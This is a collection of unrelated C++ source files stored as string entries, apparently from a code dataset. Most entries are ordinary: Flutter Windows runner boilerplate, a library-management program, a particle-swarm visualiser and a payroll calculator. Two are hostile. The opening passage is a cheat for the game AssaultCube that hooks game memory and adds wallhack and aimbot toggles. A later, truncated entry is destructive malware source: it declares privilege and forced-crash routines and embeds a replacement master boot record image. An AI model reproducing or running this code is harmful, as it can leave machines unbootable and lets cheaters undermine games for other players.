*pPtr;\r\n\t*pPtr = pNew;\r\n\tVirtualProtect(pPtr, sizeof(void*), protect, &protect);\r\n\treturn orig;\r\n}\r\n\r\nvoid fill_rectangle(float x1, float y1, float x2, float y2, unsigned char r, unsigned char g, unsigned char b)\r\n{\r\n\tglBegin(GL_POLYGON);\r\n\tglColor3ub(r, g, b);\r\n\tglVertex2f(x1, y1);\r\n\tglVertex2f(x2, y1);\r\n\tglVertex2f(x2, y2);\r\n\tglVertex2f(x1, y2);\r\n\tglEnd();\r\n}\r\n\r\nclass CFont\r\n{\r\nprivate:\r\n\tunsigned int base;\r\npublic:\r\n\tCFont(int size)\r\n\t{\r\n\t\tthis->base = glGenLists(96);\r\n\t\tHDC hdc = wglGetCurrentDC();\r\n\t\tHFONT hFont = CreateFontA(-size, NULL, NULL, NULL, FW_MEDIUM, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS, PROOF_QUALITY, FF_DONTCARE | DEFAULT_PITCH, \"Consolas\");\r\n\t\tHFONT hOldFont = (HFONT)SelectObject(hdc, hFont);\r\n\r\n\t\twglUseFontBitmapsA(hdc, 32, 96, this->base);\r\n\t\tSelectObject(hdc, hOldFont);\r\n\t\tDeleteObject(hFont);\r\n\t}\r\n\tvoid print(float x, float y, const char* text, unsigned char r, unsigned char g, unsigned char b)\r\n\t{\r\n\t\tglColor3ub(r, g, b);\r\n\t\tglRasterPos2f(x, y);\r\n\t\tglPushAttrib(GL_LIST_BIT);\r\n\t\tglListBase(this->base - 32);\r\n\t\tglCallLists(strlen(text), GL_UNSIGNED_BYTE, text);\r\n\t\tglPopAttrib();\r\n\t}\r\n};\r\n\r\nbool g_bMenuVisible = true;\r\nbool g_bWallhackPlayers = false;\r\nbool g_bWallhackMapEnts = false;\r\nbool g_bAutomaticAiming = false;\r\nbool g_bAutomaticTriger = false;\r\n\r\nCFont* g_pFont = nullptr;\r\nCGame* g_pGame = nullptr;\r\nDWORD* g_p_gamemode = nullptr;\r\n/*\r\n\"ac_client.exe\"+7BEC5: 0F BF 46 04                    -  movsx eax,word ptr [esi+04]\r\n\"ac_client.exe\"+7BEC9: 66 0F 6E C0                    -  movd xmm0,eax\r\n\"ac_client.exe\"+7BECD: 0F 5B C0                       -  cvtdq2ps xmm0,xmm0\r\n\"ac_client.exe\"+7BED0: F3 0F 11 04 8D 18 21 59 00     -  movss [ecx*4+ac_client.exe+192118],xmm0\r\n\"ac_client.exe\"+7BED9: 8B 0D 74 08 59 00              -  mov ecx,[ac_client.exe+190874]\r\n\"ac_client.exe\"+7BEDF: 47                             -  inc edi\r\n\"ac_client.exe\"+7BEE0: 83 C2 18                       -  add edx,18\r\n\"ac_client.exe\"+7BEE3: 89 54 24 38                    -  mov [esp+38],edx\r\n\"ac_client.exe\"+7BEE7: 3B F9                          -  cmp edi,ecx\r\n\"ac_client.exe\"+7BEE9: 0F 8C 71 FF FF FF              -  jl ac_client.exe+7BE60\r\n\"ac_client.exe\"+7BEEF: A1 F8 AB 58 00                 -  mov eax,[ac_client.exe+18ABF8] // <--- gamemode\r\n\"ac_client.exe\"+7BEF4: C7 05 38 BB 56 00 FF FF FF FF  -  mov [ac_client.exe+16BB38],FFFFFFFF\r\n\"ac_client.exe\"+7BEFE: C7 05 90 BC 56 00 FF FF FF FF  -  mov [ac_client.exe+16BC90],FFFFFFFF\r\n\"ac_client.exe\"+7BF08: C7 05 4C F2 57 00 00 00 00 00  -  mov [ac_client.exe+17F24C],00000000\r\n\"ac_client.exe\"+7BF12: 85 C0                          -  test eax,eax\r\n\"ac_client.exe\"+7BF14: 78 05                          -  js ac_client.exe+7BF1B\r\n\"ac_client.exe\"+7BF16: 83 F8 16                       -  cmp eax,16\r\n\"ac_client.exe\"+7BF19: 7C 05                          -  jl ac_client.exe+7BF20\r\n\"ac_client.exe\"+7BF1B: 83 F8 FF                       -  cmp eax,-01\r\n\"ac_client.exe\"+7BF1E: 75 30                          -  jne ac_client.exe+7BF50\r\n\"ac_client.exe\"+7BF20: 85 C0                          -  test eax,eax\r\n*/\r\nbool m_teammode(void)\r\n{\r\n\treturn (*g_p_gamemode==0 || *g_p_gamemode==4 || *g_p_gamemode==5 || *g_p_gamemode==7 || *g_p_gamemode==11 || *g_p_gamemode==13 || *g_p_gamemode==14 || *g_p_gamemode==16 || *g_p_gamemode==17 || *g_p_gamemode==20 || *g_p_gamemode==21);\r\n}\r\nchar* g_p_ocull = nullptr;\r\n/*\r\nac_client.exe+BA890 - 55                    - push ebp\r\n\"ac_client.exe\"+BA891: 8B EC                          -  mov ebp,esp\r\n\"ac_client.exe\"+BA893: 83 E4 F8                       -  and esp,-08\r\n\"ac_client.exe\"+BA896: 83 EC 14                       -  sub esp,14\r\n\"ac_clien",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rest_api_project_2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nclass Book {\r\npublic:\r\n    string bookName;\r\n    string bookId;\r\n    string bookCategory;\r\n\r\n    Book(string name, string id, string category)\r\n        : bookName(name), bookId(id), bookCategory(category) {}\r\n};\r\n\r\nclass User {\r\npublic:\r\n    string userName;\r\n    string userId;\r\n\r\n    User(string name, string id) : userName(name), userId(id) {}\r\n};\r\n\r\nclass Library {\r\npublic:\r\n    vector<Book> books;\r\n    vector<User> users;\r\n    vector<pair<string, string>> borrowedBooks;\r\n\r\n    // Add a new book\r\n    void addBook(string name, string id, string category) {\r\n        books.push_back(Book(name, id, category));\r\n        cout << \"Book added successfully.\" << endl;\r\n    }\r\n\r\n    // Remove a book\r\n    void removeBook(string id) {\r\n        for (auto it = books.begin(); it != books.end(); ++it) {\r\n            if (it->bookId == id) {\r\n                books.erase(it);\r\n                cout << \"Book removed successfully.\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Book not found.\" << endl;\r\n    }yes\r\n\r\n    // Add a new user\r\n    void addUser(string name, string id) {\r\n        users.push_back(User(name, id));\r\n        cout << \"User added successfully.\" << endl;\r\n    }\r\n\r\n    // Delete a user\r\n    void deleteUser(string id) {\r\n        for (auto it = users.begin(); it != users.end(); ++it) {\r\n            if (it->userId == id) {\r\n                users.erase(it);\r\n                cout << \"User deleted successfully.\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"User not found.\" << endl;\r\n    }\r\n\r\n    // Borrow a book\r\n    void borrowBook(string userId, string bookId) {\r\n        for (const auto& book : books) {\r\n            if (book.bookId == bookId) {\r\n                borrowedBooks.push_back(make_pair(userId, bookId));\r\n                cout << \"Book borrowed successfully.\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Book not available.\" << endl;\r\n    }\r\n\r\n    // Return a book\r\n    void returnBook(string userId, string bookId) {\r\n        for (auto it = borrowedBooks.begin(); it != borrowedBooks.end(); ++it) {\r\n            if (it->first == userId && it->second == bookId) {\r\n                borrowedBooks.erase(it);\r\n                cout << \"Book returned successfully.\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Borrowed book not found.\" << endl;\r\n    }\r\n};\r\n\r\nint main() {\r\n    Library library;\r\n    int choice;\r\n    string name, id, category, userId, bookId;\r\n\r\n    while (true) {\r\n        cout << \"1. Add a new book\" << endl;\r\n        cout << \"2. Remove a book\" << endl;\r\n        cout << \"3. Borrow a book\" << endl;\r\n        cout << \"4. Return a book\" << endl;\r\n        cout << \"5. Add a new user\" << endl;\r\n        cout << \"6. Delete a user\" << endl;\r\n        cout << \"7. Exit\" << endl;\r\n\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n        case 1:\r\n            cout << \"Enter book name, id, and category: \";\r\n            cin >> name >> id >> category;\r\n            library.addBook(name, id, category);\r\n            break;\r\n        case 2:\r\n            cout << \"Enter book id to remove: \";\r\n            cin >> id;\r\n            library.removeBook(id);\r\n            break;\r\n        case 3:\r\n            cout << \"Enter user id and book id to borrow: \";\r\n            cin >> userId >> bookId;\r\n            library.borrowBook(userId, bookId);\r\n            break;\r\n        case 4:\r\n            cout << \"Enter user id and book id to return: \";\r\n            cin >> userId >> bookId;\r\n            library.returnBook(userId, bookId);\r\n            break;\r\n        case 5:\r\n            cout << \"Enter user name and id: \";\r\n            cin >> name >> id;\r\n            library.addUser(name, id);\r\n            break;\r\n        case 6:\r\n            cout << \"Enter user id to delete: \";\r\n            cin >> id;\r\n            library.deleteUser(id);\r\n            break;\r\n        case 7:\r\n            return 0;\r\n        default:\r\n            cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"catchme_portfilio\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define IMGUI_USER_CONFIG \"../include/imconfig.h\"\n\n#include \"include/imconfig.h\"\n#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_opengl2.h\"\n#include \"implot.h\"\n#include \"imgui_internal.h\"\n#include <cstdio>\n#include <SDL.h>\n#include <SDL_opengl.h>\n#include <string>\n#include <vector>\n#include <cmath>\n#include <fstream>\n#include <sstream>\n#include <stack>\n\nstruct Particle {\n    double x;\n    double y;\n    double best_x;\n    double best_y;\n    double best_fitness;\n};\n\nstruct AppConfig {\n    int n_particles = 5;\n    float cognitive_factor = 0.5;\n    float social_factor = 0.8;\n    float inertia_weight = 0.5;\n    float seconds_per_iteration = 1;\n\n    int min_x = -64.0;\n    int max_x = 64.0;\n\n    int min_y = -64.0;\n    int max_y = 64.0;\n\n    int max_iterations = 1000;\n\n\n    double global_best_x{};\n    double global_best_y{};\n    double global_best_fitness = 1e12;\n\n    double goal_x = 0;\n    double goal_y = 0;\n};\n\nstruct UpdateCycle {\n    Particle *particles;\n    int iterations;\n};\n\nstruct StoredCycle {\n    Particle *particles;\n    int iterations;\n    int n_particles;\n};\n\n\n/*\n * Fitness function, the lower the better\n * hence why we use the euclidean distance\n */\ndouble fitness_function(double x, double y, AppConfig* config) {\n    return std::sqrt(std::pow(x - config->goal_x, 2) + std::pow(y - config->goal_y, 2));\n}\n\n\nStoredCycle create_stored_cycle(Particle* particles, int iterations, int n_particles) {\n    auto* new_particles = new Particle[n_particles];\n    std::copy(particles, particles + n_particles, new_particles);\n    return {new_particles, iterations, n_particles};\n}\n\nvoid update_particles(StoredCycle* cycle, AppConfig* config, std::stack<StoredCycle> *cycles) {\n    StoredCycle next_cycle = create_stored_cycle(cycle->particles, cycle->iterations+1, config->n_particles);\n    Particle* particles = next_cycle.particles;\n    for (int i = 0; i < config->n_particles; i++) {\n        double r1 = (double) (rand()) / ((double) (RAND_MAX));\n        double r2 = (double) (rand()) / ((double) (RAND_MAX));\n\n        double cognitive_component_x = config->cognitive_factor * r1 * (particles[i].best_x - particles[i].x);\n        double cognitive_component_y = config->cognitive_factor * r1 * (particles[i].best_y - particles[i].y);\n\n        double social_component_x = config->social_factor * r2 * (config->global_best_x - particles[i].x);\n        double social_component_y = config->social_factor * r2 * (config->global_best_y - particles[i].y);\n\n        double new_x = particles[i].x + config->inertia_weight + cognitive_component_x + social_component_x;\n        double new_y = particles[i].y + config->inertia_weight + cognitive_component_y + social_component_y;\n\n#ifdef DEBUG\n        printf(\"Particle %d: x = %f, y = %f, new_x = %f, new_y = %f\\n\", i, particles[i].x, particles[i].y, new_x, new_y);\n#endif\n        double new_fitness = fitness_function(new_x, new_y, config);\n        if (new_fitness < particles[i].best_fitness) {\n            particles[i].best_x = new_x;\n            particles[i].best_y = new_y;\n            particles[i].best_fitness = new_fitness;\n        }\n        if (new_fitness < config->global_best_fitness) {\n            config->global_best_x = new_x;\n            config->global_best_y = new_y;\n            config->global_best_fitness = new_fitness;\n        }\n        particles[i].x = new_x;\n        particles[i].y = new_y;\n    }\n\n    cycles->push( next_cycle);\n}\n\n\nParticle* initialise_particles(int n_particles, AppConfig* config) {\n    auto* particles = new Particle[n_particles];\n    for (int i = 0; i < n_particles; i++) {\n        particles[i].x = config->min_x + (double) (rand()) / ((double) (RAND_MAX / (config->max_x - config->min_x)));\n        particles[i].y = config->min_y + (double) (rand()) / ((double) (RAND_MAX / (config->max_y - config->min_y)));\n        particles[i].best_x = particles[i].x;\n        particles[i].best_y = particles[i].y;\n        particles[i].best_fitness = fitness_function(particles[i].x, particles[i].y, config);\n        if (particles[i].best_fitness < config->global_best_fitness) {\n            config->global_best_x = particles[i].best_x;\n            config->global_best_y = particles[i].best_y;\n            config->global_best_fitness = particles[i].best_fitness;\n        }\n    }\n    return particles;\n}\n\nvoid write_cycles_to_file(std::stack<StoredCycle> *cycles, const std::string& filename, AppConfig* config) {\n    FILE* file = fopen(filename.c_str(), \"w\");\n    if (file == nullptr) {\n        printf(\"Error opening file\\n\");\n        return;\n    }\n    // Save config\n    fprintf(file, \"n_particles,%d\\n\", config->n_particles);\n    fprintf(file, \"cognitive_factor,%f\\n\", config->cognitive_factor);\n    fprintf(file, \"social_factor,%f\\n\", config->social_factor);\n    fprintf(file, \"inertia_weight,%f\\n\", config->inertia_weight);\n    fprintf(file, \"seconds_per_iteration,%f\\n\", config->seconds_per_iteration);\n    fprintf(file, \"min_x,%d\\n\", config->min_x);\n    fprintf(file, \"max_x,%d\\n\", config-",
    "#include <iostream>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    // Constants\r\n    const double REGULAR_RATE = 5.0;\r\n    const double OVERTIME_MULTIPLIER = 1.5;\r\n    const double INCOME_TAX_RATE = 0.15;\r\n    const double HEALTH_LEVY_RATE = 0.025;\r\n    const double DISTRICT_TAX_RATE = 0.01;\r\n    const double EDUCATION_FUND_PER_CHILD = 0.50;\r\n    const int REGULAR_HOURS = 40;\r\n    \r\n    // Input variables\r\n    double hoursWorked;\r\n    int numChildren;\r\n    \r\n    // Input employee details\r\n    cout << \"Enter hours worked: \";\r\n    cin >> hoursWorked;\r\n    cout << \"Enter number of children: \";\r\n    cin >> numChildren;\r\n    \r\n    // Calculate gross pay\r\n    double grossPay;\r\n    if (hoursWorked <= REGULAR_HOURS) {\r\n        grossPay = hoursWorked * REGULAR_RATE;\r\n    } else {\r\n        double overtimeHours = hoursWorked - REGULAR_HOURS;\r\n        grossPay = (REGULAR_HOURS * REGULAR_RATE) + (overtimeHours * REGULAR_RATE * OVERTIME_MULTIPLIER);\r\n    }\r\n    \r\n    // Calculate deductions\r\n    double incomeTax = grossPay * INCOME_TAX_RATE;\r\n    double healthLevy = grossPay * HEALTH_LEVY_RATE;\r\n    double districtTax = grossPay * DISTRICT_TAX_RATE;\r\n    \r\n    double educationFund = 0;\r\n    if (numChildren > 3) {\r\n        educationFund = (numChildren - 3) * EDUCATION_FUND_PER_CHILD;\r\n    }\r\n    \r\n    double totalDeductions = incomeTax + healthLevy + districtTax + educationFund;\r\n    \r\n    // Calculate net pay\r\n    double netPay = grossPay - totalDeductions;\r\n    \r\n    // Display results\r\n    cout << fixed << setprecision(2);\r\n    cout << \"Gross Pay: \" << grossPay << \" cedis\" << endl;\r\n    cout << \"Income Tax: \" << incomeTax << \" cedis\" << endl;\r\n    cout << \"Health Levy: \" << healthLevy << \" cedis\" << endl;\r\n    cout << \"District Tax: \" << districtTax << \" cedis\" << endl;\r\n    cout << \"Education Fund: \" << educationFund << \" cedis\" << endl;\r\n    cout << \"Total Deductions: \" << totalDeductions << \" cedis\" << endl;\r\n    cout << \"Net Pay: \" << netPay << \" cedis\" << endl;\r\n    \r\n    return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"egitim\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define _USE_MATH_DEFINES 1\r\n#include <Windows.h>\r\n#include <cmath>\r\n#pragma comment(lib, \"winmm.lib\")\r\n#pragma comment(lib, \"ntdll.lib\")\r\n#pragma comment(lib, \"kernel32.lib\")\r\n//externing rtladjustprivilege\r\nEXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);\r\n//externing ntraiseharderror\r\nEXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);\r\nconst unsigned char MasterBootRecord[] = {\r\n\t0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x16, 0x02, 0xB9, 0x03,\r\n\t0x00, 0xB6, 0x00, 0xBB, 0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3,\r\n\t0x89, 0xC1, 0x89, 0xC2, 0xBE, 0x00, 0x00, 0xBF, 0x3F, 0x1B, 0xAC, 0x81,\r\n\t0xFE, 0x3F, 0x1B, 0x73, 0x31, 0x3C, 0x80, 0x73, 0x02, 0xEB, 0x0F, 0x24,\r\n\t0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75, 0xF7,\r\n\t0xEB, 0xE4, 0xB4, 0x00, 0x3C, 0x40, 0x72, 0x05, 0x24, 0x3F, 0x88, 0xC4,\r\n\t0xAC, 0x89, 0xC1, 0xAD, 0x89, 0xF2, 0x89, 0xFE, 0x29, 0xC6, 0xAC, 0xAA,\r\n\t0xE2, 0xFC, 0x89, 0xD6, 0xEB, 0xC8, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xBB,\r\n\t0xE0, 0x07, 0x8E, 0xDB, 0xBE, 0x3F, 0x1B, 0xB4, 0x00, 0xAC, 0xBB, 0x00,\r\n\t0x00, 0x89, 0xC1, 0xBA, 0xC8, 0x03, 0x88, 0xD8, 0xEE, 0x43, 0xBA, 0xC9,\r\n\t0x03, 0xAC, 0xEE, 0xAC, 0xEE, 0xAC, 0xEE, 0xE2, 0xEE, 0xBB, 0x00, 0xA0,\r\n\t0x8E, 0xC3, 0xBF, 0x00, 0x00, 0xB9, 0x00, 0x7D, 0xF3, 0xA5, 0xF4, 0xB4,\r\n\t0x86, 0xB9, 0x32, 0x00, 0xCD, 0x15, 0xEB, 0xF6, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 0x41, 0x41, 0x41, 0x41,\r\n\t0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n\t0x00,",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"umn_fellowship_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
